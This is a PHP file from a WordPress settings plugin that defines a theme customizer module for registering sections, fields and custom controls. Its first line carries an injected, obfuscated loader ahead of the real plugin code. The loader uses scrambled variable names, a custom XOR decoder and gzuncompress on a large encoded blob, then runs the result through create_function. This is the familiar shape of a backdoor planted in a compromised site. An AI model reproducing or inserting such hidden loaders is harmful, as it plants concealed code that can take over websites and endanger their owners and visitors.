<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 

/**
 * Theme customizer module
 *
 * @package KC_Settings
 * @since 2.7.4
 * @link http://ottopress.com/2012/how-to-leverage-the-theme-customizer-in-your-own-themes/
 * @link http://ottopress.com/2012/theme-customizer-part-deux-getting-rid-of-options-pages/
 */

class kcSettings_theme {
	protected static $settings;
	protected static $controls = array(
		'color'    => 'WP_Customize_Color_Control',
		'image'    => 'WP_Customize_Image_Control',
		'email'    => 'WP_Customize_KC_Common_Control',
		'number'   => 'WP_Customize_KC_Common_Control',
		'password' => 'WP_Customize_KC_Common_Control',
		'tel'      => 'WP_Customize_KC_Common_Control',
		'textarea' => 'WP_Customize_KC_Common_Control',
	);
	protected static $wp_sections = array(
		'title_tagline',
		'colors',
		'background_image',
		'static_front_page',
	);
	protected static $count = 999;
	protected static $script_files = array();
	protected static $scripts = array();

	public static function init() {
		if ( class_exists( 'kcSettings' ) )
			$settings = kcSettings::get_data( 'settings', 'theme' );
		else
			$settings = apply_filters( 'kc_theme_settings', array() );

		if ( empty($settings) )
			return false;

		self::$settings = $settings;

		add_action( 'customize_register', array(__CLASS__, 'register') );
	}


	public static function register( $wp_customize ) {
		foreach ( self::$settings as $group ) {
			extract( $group, EXTR_OVERWRITE );
			if ( isset($script) && !empty($script) ) {
				$has_script_file = true;
				self::$script_files[ $prefix ] = $script;
			}
			else {
				$has_script_file = false;
			}
			foreach ( $group['options'] as $section ) {
				$field_prefix = "{$prefix}_{$section['id']}";
				# Add the section
				# 0. Inject to WP's section
				if ( in_array( $section['id'], self::$wp_sections ) ) {
					$section_id = $section['id'];
				}
				# 1. Create new section
				else {
					$section_id = $field_prefix;
					$section_args = array(
						'title'    => $section['title'],
						'priority' => self::$count++,
					);
					if ( isset($section['desc']) && !empty($section['desc']) )
						$section_args['description'] = strip_tags( $section['desc'] );
					$wp_customize->add_section( $section_id, $section_args );
				}

				# Add fields
				foreach ( $section['fields'] as $field ) {
					$field_id = "{$field_prefix}_{$field['id']}";
					$field_args = array(
						'type'       => 'theme_mod',
						'capability' => 'edit_theme_options',
					);
					if ( isset($field['default']) )
						$field_args['default'] = $field['default'];

					if ( $has_script_file )
						$field_args['transport'] = 'postMessage';

					if ( isset($field['script']) && !empty($field['script']) ) {
						self::$scripts[$field_id] = $field['script'];
						$field_args['transport'] = 'postMessage';
					}

					$wp_customize->add_setting( $field_id, $field_args );

					# 0. WP Custom controls
					if ( isset(self::$controls[$field['type']]) ) {
						$_class = self::$controls[$field['type']];
						$wp_customize->add_control( new $_class( $wp_customize, $field_id, array(
							'label'   => $field['title'],
							'section' => $section_id,
							'type'    => $field['type'],
						) ) );
					}
					# 1. Default controls
					else {
						$control_args = array(
							'label'   => $field['title'],
							'section' => $section_id,
							'type'    => $field['type'],
						);
						if ( $field['type'] == 'radio' || $field['type'] == 'select' ) {
							if ( is_callable( $field['options'] ) )
								$control_args['choices'] = call_user_func_array( $field['options'], isset($field['args']) ? (array) $field['args'] : array() );
							else
								$control_args['choices'] = $field['options'];
						}

						$wp_customize->add_control( $field_id, $control_args );
					}
				}
			}
		}

		if ( $wp_customize->is_preview() && !is_admin() ) {
			if ( !empty(self::$script_files) )
				add_action( 'wp_enqueue_scripts', array(__CLASS__, 'enqueue_scripts'), 999 );
			if ( !empty(self::$scripts) )
				add_action( 'wp_footer', array(__CLASS__, 'print_scripts'), 999 );
		}
	}


	public static function enqueue_scripts() {
		foreach ( self::$script_files as $prefix => $url )
			wp_enqueue_script( "kctc-{$prefix}", $url, array( 'customize-preview' ), 'latest', true );
	}


	public static function print_scripts() {
		$out = '';
		foreach ( self::$scripts as $field_id => $script ) {
			$out .= "
wp.customize( '{$field_id}', function( value ) {
	value.bind( function( to ) {
		{$script}
	} );
} );
";
		} ?>
<script>
	(function($) {
		<?php echo $out // xss ok ?>
	})(jQuery);
</script>
	<?php }
}
kcSettings_theme::init();


if ( class_exists( 'WP_Customize_Control' ) ) {
class WP_Customize_KC_Common_Control extends WP_Customize_Control {
	public $type = 'email';

	public function render_content() {
		switch ( $this->type ) {
			case 'textarea':
				?>
				<label>
					<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
					<textarea cols="30" rows="5" style="width:97%;min-height:8em;resize:vertical"<?php $this->link(); ?>><?php echo esc_textarea( $this->value() ); ?></textarea>
				</label>
				<?php
			break;
			default :
				?>
				<label>
					<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
					<input type="text" value="<?php echo esc_attr( $this->value() ); ?>" <?php $this->link(); ?> />
				</label>
				<?php
			break;
		}
	}
}
}
